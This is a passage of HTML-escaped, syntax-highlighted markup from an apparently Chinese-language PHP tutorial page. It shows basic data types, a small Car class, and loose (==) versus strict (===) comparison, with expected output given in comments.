&lt;span class=&#34;token comment&#34;&gt;// 结束需要独立一行且前后不能空格&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;数据类型&#34;&gt;&lt;a href=&#34;#数据类型&#34; class=&#34;headerlink&#34; title=&#34;数据类型&#34;&gt;&lt;/a&gt;数据类型&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hello world&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;djh $x&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$z&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;djh &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$z&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;aaa&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;bbbb&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;aa&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;s&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;djh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x8C&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$d&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x8C&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//16进制&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$d&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;047&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//8进制&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2.4e3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$f&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$f&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$g&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$g&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$f&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$g&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Car&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$color&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$color&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;green&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;color&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$color&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;what_color&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;print_vars&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$obj&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get_object_vars&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$obj&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$prop&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
     &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\t&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$prop&lt;/span&gt;&lt;/span&gt; = &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$val&lt;/span&gt;&lt;/span&gt;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// 实例一个对象&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$herbie&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Car&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;white&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// 显示 herbie 属性&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\therbie: Properties\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;print_vars&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$herbie&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;/*
string(11) &#34;hello world&#34; string(6) &#34;djh $x&#34; string(15) &#34;djh hello world&#34; string(7) &#34;aaabbbb&#34; aaa satestdjhint(140) int(140) int(39) float(2400) bool(false) NULL 10 herbie: Properties color = white
*/&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;类型比较&#34;&gt;&lt;a href=&#34;#类型比较&#34; class=&#34;headerlink&#34; title=&#34;类型比较&#34;&gt;&lt;/a&gt;类型比较&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;//松散比较：使用两个等号 == 比较，只比较值，不比较类型。
//严格比较：用三个等号 === 比较，除了比较值，也比较类型。

&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;0 == false: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;0 === false: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;0 == null: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;0 === null: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;false == null: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;false === null: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#34;0&#34; == false: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;0&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#34;0&#34; === false: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;0&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#34;0&#34; == null: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;0&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#34;0&#34; === null: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;0&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#34;&#34; == false: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#34;&#34; === false: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#34;&#34; == null: &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
